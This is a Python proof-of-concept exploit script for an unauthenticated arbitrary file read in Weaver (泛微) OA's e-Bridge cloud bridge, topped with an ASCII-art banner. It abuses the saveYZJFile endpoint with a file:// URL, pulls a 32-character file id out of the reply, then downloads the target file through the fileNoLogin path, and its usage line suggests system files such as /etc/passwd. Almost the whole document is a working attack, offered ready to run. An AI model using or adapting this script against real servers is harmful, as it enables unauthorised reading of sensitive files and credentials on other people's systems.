#/usr/bin/python3
# -*- coding: utf-8 -*-
#2020/9/02/00/21
#Marmot

import re
import requests
import optparse

def fwy(Host,Ports,Files):
    poc = f"{Host}:{Ports}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///{Files}&fileExt=txt"
    print(f"[+] {poc}")
    r = requests.get(poc,timeout=5)
    data = r.text
    key = str(re.findall(r'id":"(\w{32})\"', data))
    key = key.strip('[]')
    if key == "":
        print(f"[-] There are no explosible vulnerabilities in this URL")
        exit(0)
    else:
        print(f"[+] key = {key}")
        fwyexp(Host,Ports,key)
        return

def fwyexp(Host,Ports,key):
    key = key.strip("'")
    urlexp = f"{Host}:{Ports}/file/fileNoLogin/{key}"
    r = requests.get(urlexp,timeout=5)
    data = r.text
    print(f"[+] {urlexp}")
    print(data)

def main():
    usage = "python3 poc.py -H http://127.0.0.1 -P 8888 -W etc/pwsswd or C:/Windows"
    parser = optparse.OptionParser(usage)
    parser.add_option('-H',dest='Host',type='string',help='tagget host')
    parser.add_option('-P','-p',dest='Ports',type='string',help='target Port',default='80')
    parser.add_option('-W','-w',dest='Files',type='string',help='file path')
    (options,args) = parser.parse_args()
    Host = options.Host
    Ports = options.Ports
    Files = options.Files
    
    print(''' 
 ▄▄▄▄▄▄▄▄▄▄▄               ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌             ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀              ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌                       ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░▌       ▐░▌▐░▌ ▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌     ▐░▌     ▐░▌       ▐░▌▐░▌▐░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░▌       ▐░▌▐░▌ ▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌                       ▐░▌       ▐░▌▐░▌     ▐░▌       ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
▐░█▄▄▄▄▄▄▄▄▄              ▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌             ▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀               ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                                        ''')
    if Host == None or Ports == None or Files == None:
        print('[*]2020泛微OA云桥未授权任意文件读取')
        print('[*] python poc.py -H http://127.0.0.1 -P 8888 -W etc/pwsswd or C:/Windows')
        print('[-] Host, Ports and Files cannot be empty')
    else:
        print('[+] ---------------start-----------------')
        fwy(Host,Ports,Files)

if __name__ == "__main__":
    main()
